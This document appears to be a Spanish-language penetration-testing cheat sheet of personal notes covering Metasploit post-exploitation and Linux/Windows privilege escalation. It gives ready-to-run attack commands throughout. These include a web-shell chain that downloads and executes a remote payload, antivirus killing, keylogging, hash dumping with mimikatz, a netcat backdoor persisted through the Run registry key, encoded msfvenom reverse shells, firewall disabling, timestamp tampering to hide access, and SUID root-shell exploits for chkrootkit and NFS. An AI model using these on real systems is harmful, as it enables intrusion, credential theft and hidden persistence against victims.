Webserver con webdav -> cadaver [url]
	Dentro del webserver, para subir archivos -> put [ubicación]

Para escribir sin editor de texto: "cat << EOF > archivoACrear", y escribimos lo que queramos. Finalizar con EOF

**Obtener shell**
awk 'BEGIN {system("/bin/sh")}' Para sacar shell si se tienen permisos con awk pro alguna razón
:!bash // Shell desde Vi
:set shell=/bin/bash:shell // Shell desde Vi
python -c 'import pty;pty.spawn("/bin/bash")'

Antes de acceder a un fichero, apuntar su timestamp y luego volver a modificarlo con touch

Si queremos agregar algun usuario a sudoers, visudo y debajo de root ALL=(ALL:ALL) ALL poner lo mismo pero con nombre del usuario

#TRANSFERENCIA DE ARCHIVOS
mkdir server
// Poner los archivos en la carpeta
python -m SimpleHTTPServer 80
---
curl -s --data "cmd=wget IP-A-LA-SHELL.sh -O /tmp/evil" http://$ip/files/sh.php
curl -s --data "cmd=chmod 777 /tmp/evil" http://$ip/files/sh.php
curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php


#METASPLOIT
**Meterpreter**
use incognito
Después list_tokens -u
impersonate_token NOMBRE_TOKEN (Añadiendo doble barra cuando haya una barra \ -> \\
Si estamos utilizando meterpreter en un servicio que el usuario puede cerrar, cambiar a otro proceso con migrate PID
run post/windows/manage/migrate => Migrar de proceso para seguir en el sistema
Para capturar lo que escriba el usuario mejor estar en explorer.exe, y si queremos capturar las credenciales sin crackearlas, winlogon.exe. Cerrar con Ctrl+C
run killav Para parar antivirus
run persistence -X -i ITERACIONES_ENCODER -p PUERTO -r NUESTRA IP => Para tener persistencia en el sistema
Para descargar archivos, "download [archivo]" y para subirlos, "upload [archivo]", pudiendo seleccionar la ruta con "upload [archivo] [ruta de destino (teniendo en cuenta que sería del estilo C:\\windows\\system32\\)]"
Para ganar los máximos privilegios posibles, "getprivs"
Comando "search" para listar archivos, buscando con "*.doc" o cualquier extensión
"sysinfo" para info
"idletime" para ver cuánto tiempo lleva encendido el target
"screenshot" para captura de pantalla
"uictl [enable/disable] [keyboard/mouse]" habilita o deshabilita teclado y/o ratón
sysinfo
screenshot
Para habilitar el keylogger -> keyscan_start y para obtener lo escrito keyscan_dump
Para recolectar todos los hashes y tokens de la máquina víctima "run credcollector" dentro de meterpreter, o "hashdump" para obtener los hashes
Después ponemos la sesión en background y utilizamos "use post/windows/gather/hashdump" y hacemos "set [sesión que tenemos corriendo]" y run
Finalmente lanzamos use auxiliary/analyze/jtr_crack_fast y run para crackearlos. SI SALE ALGÚN ERROR EN EL MÓDULO HAY QUE COMENTAR LA LÍNEA 110
También podemos cargar mimikatz con load mimikatz utilizar mimikatz_command -f samdump::hashes, y luego wdigest
getsystem
run post/windows/escalate/bypassuac Y luego getsystem
**Backdoor:**
    Desactivar firewall
    kill av => Puede que no esté el nombre, así que habría que hacerlo a mano con el PID
    upload pentest/windows-binaries/tools/nc.exe C:\\Windows\\
    reg setval -k HKLM \\software\\microsoft\\windows\\currentversion\\run -c 'C:\RUTA_DE_NC -Ldp 4444 -c cmd.exe' -v netcat (o un nombre más discreto)
    Conectarse con nc -v IP PUERTO

    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 (o las que queramos) LHOST = IP_LOCAL LPORT = PUERTO_LOCAL -f exe > backdoor.exe
    Lo subimos con upload
    Y hacemos los mismo que con nc para hacerlo persistente

msfvenom -l (lista payloads disponibles)
msfvenom -p [PAYLOAD] LHOST=[Nuestra IP] LPORT=[Puerto de escucha] -f raw > [archivo donde se creará]
	ejemplo -> php/meterpreter /reverse_tcp
msfvenom -p [PAYLOAD] -e [encoder (recomendado shikata_ga_nai)] -i [número de iteraciones que se aplica el encoder] LHOST=[IP Local] LPORT=[Puerto local] -f [formato del payload]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.32 LPORT=2222 -f exe > shell2.exe

Tras subir payload a máquina víctima, ponemos Metasploit con "use multi/handler" y seleccionamos "set payload [el que hayamos usado]" y "set LHOST [nuestra IP]" y "set LPORT [el puerto elegido]" y seleccionamos "exploit"
Para salir de un meterpreter sin cerrarlo, "background", y para listar sesiones activas "sessions -l"
Para retomar una sesión en background, "sessions -i [número en la lista]"
Para cerrar una sesion en background, "sessions -k [número en la lista]"

Para modificar el registro y hacer que netcat (nc.exe que hemos subido a C:\windows\system32) se ejecute al arranque usamos reg enumkey -k [regkey a editar (en este caso HKLM\\software\\microsoft\\windows\\currentversion\\run)] y definimos que esa es la regkey a modificar
	Definimos los valores con reg setval -k [regkey a editar (en este caso HKLM\\software\\microsoft\\windows\\currentversion\\run)] -v [nombre (en este caso nc)] -d '[ruta del archivo (C:\windows\system32\nc.exe)] -Ldp [puerto de escucha] -e [qué autoejecutará nc (cmd.exe)]' (Nótesen las comillas simples para los parámetros del nc)
	Nos aseguramos que la regkey tiene esos valores con reg queryval -k [ruta de la regkey] -v [nombre (en este caso nc)]

Para modificar las reglas del Firewall y permitir el tráfico por el puerto elegido:
	Con netsh firewall show opmode vemos el estado del Firewall
	netsh firewall add portopening [Protocolo (en este caso TCP)] [Puerto a abrir] "Service Firewall" ENABLE ALL

#MYSQL
echo "show databases;" | mysql -uroot -pPASSWORD
Show all databases in mysql.

echo "use dvwa; show tables;" | mysql -uroot -pPASSWORD
Show all tables in the dvwa database.

echo "use dvwa; desc users;" | mysql -uroot -pPASSWORD
Describe the fields of the dvwa.users table.

echo "select * from dvwa.users;" | mysql -uroot -pPASSWORD
Print the contents of the dvwa.users table.
Notice the password field is displayed, where you can use tools like John the Ripper to crack it.


#WINDOWS
net config Workstation // Obtener info del equipo
net user // Obtener usuarios
ipconfig /all
ipconfig /displaydns
route print Ó netstat -r // Tabla de rutas
arp -a
netstat -ano // Conexiones activas
tasklist /svc // Lista procesos activos
net start // Lista servicios iniciados
net start/stop PROCESO // Inicia o para un servicio
netsh firewall show state // Ver estado del Firewall
netsh firewall show config
netsh firewall set opmode disable (con privilegios)

net localgroup
net user \domain (Para ver los usuarios de un dominio)
**Descargar archivos desde Windows**
	certutil.exe -urlcache -split -f http://IP:PUERTO/shell.ps shell.ps
	powershell (New-Object Net.WebClient).DownloadFile('http://IP:PUERTO/archivo', 'archivodestino')
**Ver permisos de una carpeta**
	icacls FOLDER


#LINUX
last (historial de inicios de sesión)
whoami
uname -a
cat /etc/host
cat /etc/group
cat /etc/resolv.conf
ps -xaf // Enumerar procesos en ejecución
service --status-all
grep -vE "nologin|false" /etc/passwd // Obtener usuarios que pueden hacer login en la máquina

**Elevación de privilegios**
sudo su // Probar si el usuario tiene permisos de root
sudo -l Para ver si el usuario puede ejecutar algo como root
find / -perm -4000 -ls 2> /dev/null // Para buscar ficheros con SUID activado
To see every process running as root (real & effective ID) in user format:
          ps -U root -u root u
wget https://highon.coffee/downloads/linux-local-enum.sh


----------------------------------------
Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
	cat << EOF > rootme.c
	> int main(void)
	> {
	>     setgid(0);
	>     setuid(0);
	>     execl("/bin/sh", "sh", 0);
	> }
	> EOF
Compilamos y guardamos en /tmp

Y luego en /tmp creamos el archivo update que se ejecutará como root
	cat << EOF > update
	> #!/bin/bash
	> chown root /tmp/rootme ; chgrp root /tmp/rootme ; chmod u+s /tmp/rootme
	> EOF

Finalmente ejecutamos rootme y obtenemos shell root
----------------------------------------
Con NFS no_root_squash ->

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main() {

	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}

#include <sys/types.h>
#include <unistd.h>

int main() {

setuid(0);
setgid(0);
system("/bin/sh");
return 0;

}

Ponerle propietario root y SUID desde nuestro terminal, no la shell
chown root:root archivo
chmod 4777 archivo
Ejecutarlo
----------------------------------------
